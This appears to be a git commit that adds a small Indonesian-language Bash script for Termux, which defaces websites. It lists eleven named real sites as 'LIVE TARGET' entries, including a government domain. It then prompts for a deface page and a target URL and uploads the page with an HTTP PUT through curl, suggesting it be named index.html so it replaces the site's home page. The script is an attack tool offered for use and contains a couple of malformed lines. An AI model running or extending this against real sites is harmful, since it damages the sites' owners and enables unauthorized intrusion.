d1795c8923553fe67b99117e0ce9a88e9fc3ffff
404destroy <54747842+404destroy@users.noreply.github.com>
2019-09-30 16:59:13 +0700

    Add files via upload

---
+++ new.sh
@@ -0,0 +1,42 @@
+#usr/bin/bash
+#ini hanya kumpulan script bukan recoder anjay:)
+#noob bisa apa
+
+
+
+clear
+printf "\e[1;92m                ●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬● \e[0m\n"
+printf "\e[1;92m                 .::.\e[0m\e[1;77m TU4N-D3STR0Y \e[1;92m.::.\e[0m\n"
+printf " ╔═══════════════════════════════════════════════════╗ \e[0m\n"
+printf "\e[1;77m ║\e[1;92m 4uthor   : \e[1;77m TU4N-D3STR0Y                \e[0m\e[1;77m\e[0m\n"
+printf "\e[1;77m ║\e[1;92m 7eam     : \e[1;77m D45HEXPLOITER7                     \e[0m\e[1;77m\e[0m\n"
+printf "\e[1;77m ║\e[1;92m Github   : \e[1;77m https://github.com/404destroy \e[0m\e[1;77m\e[0m\n"
+printf "\e[1;77m ║\e[1;92m YOUTUBE  : \e[1;77m TU4N-D3STR0Y \e[0m\e[1;77m
+\e[0m\n"
+printf " ╚═══════════════════════════════════════════════════╝ \e[  \n"
+printf "\e[1;93m LIVE TARGET:\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m 1 \e[0m\e[1;92m]\e[1;93m http://esfml.com\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m 2 \e[0m\e[1;92m]\e[1;93m http://contsol.co.za\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m 3 \e[0m\e[1;92m]\e[1;93m https://inlislite.perpusnas.go.id \e[0m \n"
+printf "\e[1;92m[\e[0m\e[1;77m 4 \e[0m\e[1;92m]\e[1;93m http://bitsandpieces.co.za  \e[0m  \n"
+printf "\e[1;92m[\e[0m\e[1;77m 5 \e[0m\e[1;92m]\e[1;93m http://handj.co.za  \e[0m \n"
+printf "\e[1;92m[\e[0m\e[1;77m 6 \e[0m\e[1;92m]\e[1;93m http://ayk.co.za \e[0m  \n"
+printf "\e[1;92m[\e[0m\e[1;77m 7 \e[0m\e[1;92m]\e[1;93m http://thepremiummakers.com  \e[0m  \n"
+printf "\e[1;92m[\e[0m\e[1;77m 8 \e[0m\e[1;92m]\e[1;93m http://thegiftstore.co.za \e[0m  \n"
+printf "\e[1;92m[\e[0m\e[1;77m 8 \e[0m\e[1;92m]\e[1;93m http://entitledvip.com \e[0m  \n"
+printf "\e[1;92m[\e[0m\e[1;77m 8 \e[0m\e[1;92m]\e[1;93m http://essentialtours.com \e[0m  \n"
+printf "\e[1;92m[\e[0m\e[1;77m 8 \e[0m\e[1;92m]\e[1;93m http://savanacloud.com \e[0m  \n"
+printf "\n"
+echo "note: kalo mau nebas index? script deface lu rename jadi index.html!" | lolcat -a -d 50
+printf "\n"
+read -p $'\e[1;92m[*] Masukkan Script Deface : \e[0m' script;
+read -p read -p $'\e[1;92m[*] Masukan Web Target: \e[0m' web;
+sleep 2
+echo "Tunggu......"
+sleep 1
+termux-setup-storage
+curl -T /storage/emulated/0/$script $web
+echo "Succes"
+echo "cara liat nya? $web/$script "
+read -p $'\e[1;92m[*] Pilih nomor : \e[0m' pilih
+
